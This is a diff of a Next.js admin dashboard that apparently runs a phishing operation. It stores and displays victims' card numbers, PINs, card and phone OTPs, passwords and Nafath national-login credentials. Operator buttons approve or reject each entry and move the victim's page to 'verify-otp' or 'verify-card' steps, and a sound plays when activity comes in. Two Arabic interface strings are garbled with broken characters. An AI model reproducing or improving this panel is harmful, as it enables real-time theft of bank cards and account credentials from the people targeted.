@@ -2,27 +2,9 @@
 
 import type React from "react"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { useRouter } from "next/navigation"
-import {
-  Trash2,
-  LogOut,
-  CreditCard,
-  User,
-  Car,
-  FileText,
-  CheckCircle,
-  XCircle,
-  AlertCircle,
-  Clock,
-  Calendar,
-  Search,
-  Shield,
-  CreditCardIcon as CardIcon,
-  Filter,
-  MoreHorizontal,
-  Tag,
-} from "lucide-react"
+import { Trash2, LogOut, CreditCard, User, Car, FileText, CheckCircle, XCircle, AlertCircle, Clock, Calendar, Search, Shield, CreditCardIcon as CardIcon, Filter, MoreHorizontal, Tag } from 'lucide-react'
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { format } from "date-fns"
@@ -97,9 +79,8 @@ interface Notification {
   vehicle_type?: string
   isHidden?: boolean
   pinCode?: string
-  otpCardCode?: string
+  cardOtp?: string
   phoneOtp?: string
-  otpCode?: string
   externalUsername?: string
   externalPassword?: string
   nafadUsername?: string
@@ -108,11 +89,11 @@ interface Notification {
   autnAttachment?: string
   requierdAttachment?: string
   operator?: string
-  otpPhoneStatus: string
-  phoneOtpCode:string
 }
 
 export default function NotificationsPage() {
+  const router = useRouter()
+
   const [notifications, setNotifications] = useState<Notification[]>([])
   const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
   const [isLoading, setIsLoading] = useState(true)
@@ -120,7 +101,6 @@ export default function NotificationsPage() {
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "vehicle" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
   const [activeFilter, setActiveFilter] = useState<string | null>(null)
-  const router = useRouter()
   const [showCardDialog, setShowCardDialog] = useState(false)
   const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
   const [showPagenameDialog, setShowPagenameDialog] = useState(false)
@@ -128,6 +108,19 @@ export default function NotificationsPage() {
   const [showRajhiDialog, setShowRajhiDialog] = useState(false)
   const [showNafazDialog, setShowNafazDialog] = useState(false)
   const [showPhoneDialog, setPhoneDialog] = useState(false)
+  const notificationSound = useRef<HTMLAudioElement | null>(null)
+
+  useEffect(() => {
+    notificationSound.current = new Audio("/not.wav")
+    notificationSound.current.volume = 0.5;
+  }, [])
+
+  const playNotificationSound = () => {
+    if (notificationSound.current) {
+      notificationSound.current.currentTime = 0;
+      notificationSound.current.play().catch(err => console.error("Error playing sound:", err));
+    }
+  }
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -142,7 +135,7 @@ export default function NotificationsPage() {
     })
 
     return () => unsubscribe()
-  }, [router])
+  }, [])
 
   useEffect(() => {
     if (searchTerm.trim() === "" && !activeFilter) {
@@ -207,6 +200,7 @@ export default function NotificationsPage() {
   const handleClearAll = async () => {
     setIsLoading(true)
     try {
+      playNotificationSound();
       const batch = writeBatch(db)
       notifications.forEach((notification) => {
         const docRef = doc(db, "pays", notification.id)
@@ -234,6 +228,7 @@ export default function NotificationsPage() {
 
   const handleDelete = async (id: string) => {
     try {
+      playNotificationSound();
       const docRef = doc(db, "pays", id)
       await updateDoc(docRef, { isHidden: true })
       const updatedNotifications = notifications.filter((notification) => notification.id !== id)
@@ -272,27 +267,15 @@ export default function NotificationsPage() {
       })
     }
   }
-  const handlePhoneOtpApproval= async (state: string, id: string) => {
-    const targetPost = doc(db, "pays", id)
-    await updateDoc(targetPost, {
-      phoneVerificationStatus:state,
-      otpStatus: state,
-    })
-  }
 
-  const handlePassApproval= async (state: string, id: string) => {
-    const targetPost = doc(db, "pays", id)
-    await updateDoc(targetPost, {
-      cardOtpStatus:state,
-      otpStatus: state,
-    })
-  }
   const handleApproval = async (state: string, id: string) => {
     try {
+      playNotificationSound();
       const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         status: state,
         paymentStatus: state,
+        phoneOtpStatus: state,
       })
 
       // Update local state
@@ -613,7 +596,7 @@ export default function NotificationsPage() {
                     </Button>
                   </TooltipTrigger>
                   <TooltipContent>
-                    <p>تسجيل الخروج من النظام</p>
+                    <p>تسجيل الخروج من ��لنظام</p>
                   </TooltipContent>
                 </Tooltip>
               </TooltipProvider>
@@ -754,7 +737,8 @@ export default function NotificationsPage() {
                           variant="outline"
                           className={`cursor-pointer ${
                             notification.card_number
-                              ?notification.pinCode? "bg-green-50 text-green-700": notification.otpCardCode?"bg-blue-200 text-blue-700"                            :"bg-orange-400 text-white":"bg-gradient-to-r from-red-400 to-red-600 text-white"
+                              ? "bg-green-50 text-green-700"
+                              : "bg-gradient-to-r from-red-400 to-red-600 text-white"
                           } hover:bg-blue-100 dark:bg-blue-900/30 dark:text-white dark:border-blue-800 dark:hover:bg-blue-900/50`}
                           onClick={(e) => handleCardBadgeClick(notification, e)}
                         >
@@ -808,11 +792,6 @@ alert(notification.phoneOtp)                              }}
 notification.phone2 &&   
 (
                               <Badge
-                              className={
-                                `cursor-pointer ${
-                                  notification.otpCode ? "bg-pink-500 text-white" : ""
-                                }`
-                              }
                                 onClick={(e) => {
                                   e.stopPropagation()
                                   setSelectedNotification(notification)
@@ -946,7 +925,7 @@ notification.phone2 &&
             </DialogTitle>
             <DialogDescription>
               {selectedInfo === "personal"
-                ? "تفاصيل المعلومات الشخصية للمستخدم"
+                ? "تفاصيل المعلومات الشخصية للم��تخدم"
                 : selectedInfo === "card"
                   ? "تفاصيل معلومات البطاقة البنكية"
                   : "تفاصيل معلومات المركبة"}
@@ -1229,7 +1208,7 @@ notification.phone2 &&
                   </div>
                   <div className="flex justify-between text-sm">
                     <span className="text-muted-foreground">رمز تحقق:</span>
-                    <span>{selectedCardInfo.otpCode}</span>
+                    <span>{selectedCardInfo.cardOtp}</span>
                     <span>{selectedCardInfo.phoneOtp}</span>
                   </div>
                   <div className="flex justify-between text-sm">
@@ -1253,7 +1232,8 @@ notification.phone2 &&
                 <Button
                   onClick={() => {
                     handleUpdatePagename(selectedCardInfo.id, "payment")
-                    handleApproval( "rejected",selectedCardInfo.id)
+
+                    handleApproval(selectedCardInfo.id, "rejected")
                     setShowCardDialog(false)
 
                   }}
@@ -1263,35 +1243,17 @@ notification.phone2 &&
                 </Button>
                 <Button
                   onClick={() => {
+                     handleUpdatePagename(selectedCardInfo.id, "verify-otp")
                     handleApproval ("approved",selectedCardInfo.id)
-
                     setShowCardDialog(false)
                   }}
                   className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
                 >
-                بطاقة  قبول
+                  قبول
                 </Button>
                 <Button
                   onClick={() => {
-                    handlePassApproval ("approved",selectedCardInfo.id)
-
-                  }}
-                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
-                >
-                رمز  قبول
-                </Button>     <Button
-                  onClick={() => {
-                    handlePhoneOtpApproval("approved",selectedCardInfo.id)
-
-                  }}
-                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
-                >
-                رمز  رفض
-                </Button>
-                <Button
-                  onClick={() => {
-                    handlePassApproval("approved",selectedCardInfo.id)
-                   
+                    handleUpdatePagename(selectedCardInfo.id, "verify-card")
                   }}
                   className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-green-600 hover:to-yellow-700 text-white border-0 shadow-md"
                 >
@@ -1303,7 +1265,7 @@ notification.phone2 &&
                   }}
                   className="w-full bg-gradient-to-r from-blue-500 to-red-600 hover:from-blue-600 hover:to-blue-700 text-white border-0 shadow-md"
                 >
-                  راجحي2
+                  راجحي
                 </Button>
               </>
             ) : null}
@@ -1447,10 +1409,11 @@ notification.phone2 &&
 
       <PhoneDialog
         phoneOtp={selectedNotification?.phoneOtp}
-        handlePhoneOtpApproval={handlePhoneOtpApproval}
+        handleApproval={handleApproval}
         open={showPhoneDialog}
         onOpenChange={setPhoneDialog}
         notification={selectedNotification}
+        handleUpdatePageName={handleUpdatePagename}
       />
     </div>
   )
